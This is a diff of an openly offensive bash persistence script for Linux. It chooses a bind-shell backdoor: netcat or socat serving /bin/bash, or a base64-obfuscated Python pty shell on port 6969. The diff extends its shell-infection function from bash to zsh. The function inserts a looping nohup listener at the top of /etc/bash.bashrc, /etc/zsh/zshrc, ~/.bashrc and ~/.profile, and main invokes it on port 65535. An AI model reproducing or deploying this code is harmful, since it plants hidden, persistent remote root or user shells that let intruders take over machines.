@@ -147,45 +147,89 @@ backdoor_tool_finder(){
     #backdoor_tool="nc -lvnp PORT-NUMBER -e /bin/bash" 
     #backdoor_tool="nc -lvnp PORT-NUMBER -c '/bin/bash'"
     #backdoor_tool="socat TCP-LISTEN:PORT-NUMBER,reuseaddr EXEC:/bin/bash"
-    backdoor_tool="python3 -c 'from sys import argv;from base64 import b64decode;exec(b64decode(b\"aW1wb3J0IHNvY2tldCxvcyxwdHkKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgnMC4wLjAuMCcsaW50KGFyZ3ZbMV0pKSkKcy5saXN0ZW4oMSkKYyxhPXMuYWNjZXB0KCkKb3MuZHVwMihjLmZpbGVubygpLDApCm9zLmR1cDIoYy5maWxlbm8oKSwxKQpvcy5kdXAyKGMuZmlsZW5vKCksMikKcHR5LnNwYXduKCcvYmluL2Jhc2gnKQ==\"))' 6969"
-    #backdoor_tool="python3 -c 'import socket,os,pty;s=socket.socket();s.bind((\"0.0.0.0\",PORT-NUMBER));s.listen(1);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);pty.spawn(\"/bin/bash\")'"
+    #backdoor_tool="python3 -c 'from sys import argv;from base64 import b64decode;exec(b64decode(b\"aW1wb3J0IHNvY2tldCxvcyxwdHkKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgnMC4wLjAuMCcsaW50KGFyZ3ZbMV0pKSkKcy5saXN0ZW4oMSkKYyxhPXMuYWNjZXB0KCkKb3MuZHVwMihjLmZpbGVubygpLDApCm9zLmR1cDIoYy5maWxlbm8oKSwxKQpvcy5kdXAyKGMuZmlsZW5vKCksMikKcHR5LnNwYXduKCcvYmluL2Jhc2gnKQ==\"))' 6969"
+    
 }
 
 # Infect bash environment file
-infect_bash_environment_file() {
+infect_shell_environment() {
     # $1 -> Port number to use
 
     local instruction="nohup bash -c 'while true; do $(echo $backdoor_tool | sed s/PORT-NUMBER/$1/ ); done' >/dev/null 2>&1 &"
-    echo $instruction
-    exit
-    #local instruction="nohup bash -c 'while true; do if [[ ! -p gdm3-config-err-s2fkslxkamfmasdw ]];then mkfifo gdm3-config-err-s2fkslxkamfmasdw;fi; cat gdm3-config-err-s2fkslxkamfmasdw | bash -i 2>&1 | nc -lvnp 65534 > gdm3-config-err-s2fkslxkamfmasdw; done' > /dev/null 2>&1 &"
-    # Infecting user environment file
-    if [[ -e /etc/bash.bashrc && $EUID -eq 0 ]];then
-        # Inserting instruction in the start of file /etc/bash.bashrc
-        # default configuration for bashrc
-        if ! grep "$instruction" /etc/bash.bashrc;then
-            sed -i "1i $instruction" /etc/bash.bashrc
+
+    bash_shell_environment=(
+        /etc/bash.bashrc
+        /etc/bash_completion
+        ~/.bashrc
+        ~/.profile
+    )
+
+    zsh_shell_environment=(
+        /etc/zsh/zshrc
+        /etc/zsh/zshenv
+        ~/.zshrc
+    )
+
+    if [[  $SHELL == "/usr/bin/zsh" ]];then
+        # Infecting user environment file
+        if [[ -e /etc/zsh/zshrc && $EUID -eq 0 ]];then
+            # Inserting instruction in the start of file /etc/bash.bashrc
+            # default configuration for bashrc
+            if ! grep "$instruction" /etc/zsh/zshrc;then
+                sed -i "1i $instruction" /etc/zsh/zshrc
+            fi
+
+        elif [[ -e /etc/zshenv && $EUID -eq 0 ]];then
+            # Inserting instruction in the start of file /etc/bash_completion
+            # default configuration for bashrc
+            if ! grep "$instruction" /etc/zsh/zshenv;then
+                sed -i "1i $instruction" /etc/zsh/zshenv
+            fi
+
+        elif [[ -e ~/.zshrc ]];then
+            # Inserting instruction in the start of file ~/.bashrc
+            # individual bash configuration file for every user
+            if ! grep "$instruction" ~/.zshrc;then
+                sed -i "1i $instruction" ~/.zshrc
+            fi
+
+        elif [[ -e ~/.profile ]];then
+            # Inserting instruction in the start of file ~/.profile
+            # individual bash configuration file for every user
+            if ! grep "$instruction" ~/.profile;then
+                sed -i "1i $instruction" ~/.profile
+            fi
         fi
 
-    elif [[ -e /etc/bash_completion && $EUID -eq 0 ]];then
-        # Inserting instruction in the start of file /etc/bash_completion
-        # default configuration for bashrc
-        if ! grep "$instruction" /etc/bash_completion;then
-            sed -i "1i $instruction" /etc/bash_completion
-        fi
+    elif [[ $SHELL == "/usr/bin/bash" ]];then
+        # Infecting user environment file
+        if [[ -e /etc/bash.bashrc && $EUID -eq 0 ]];then
+            # Inserting instruction in the start of file /etc/bash.bashrc
+            # default configuration for bashrc
+            if ! grep "$instruction" /etc/bash.bashrc;then
+                sed -i "1i $instruction" /etc/bash.bashrc
+            fi
 
-    elif [[ -e ~/.bashrc ]];then
-        # Inserting instruction in the start of file ~/.bashrc
-        # individual bash configuration file for every user
-        if ! grep "$instruction" ~/.bashrc;then
-            sed -i "1i $instruction" ~/.bashrc
-        fi
+        elif [[ -e /etc/bash_completion && $EUID -eq 0 ]];then
+            # Inserting instruction in the start of file /etc/bash_completion
+            # default configuration for bashrc
+            if ! grep "$instruction" /etc/bash_completion;then
+                sed -i "1i $instruction" /etc/bash_completion
+            fi
 
-    elif [[ -e ~/.profile ]];then
-        # Inserting instruction in the start of file ~/.profile
-        # individual bash configuration file for every user
-        if ! grep "$instruction" ~/.profile;then
-            sed -i "1i $instruction" ~/.profile
+        elif [[ -e ~/.bashrc ]];then
+            # Inserting instruction in the start of file ~/.bashrc
+            # individual bash configuration file for every user
+            if ! grep "$instruction" ~/.bashrc;then
+                sed -i "1i $instruction" ~/.bashrc
+            fi
+
+        elif [[ -e ~/.profile ]];then
+            # Inserting instruction in the start of file ~/.profile
+            # individual bash configuration file for every user
+            if ! grep "$instruction" ~/.profile;then
+                sed -i "1i $instruction" ~/.profile
+            fi
         fi
     fi
 }
@@ -195,7 +239,7 @@ main() {
 
     backdoor_tool_finder
 
-    infect_bash_environment_file 65535
+    infect_shell_environment 65535
     
     #infect_default_system_account
     ##infect_service_configuration
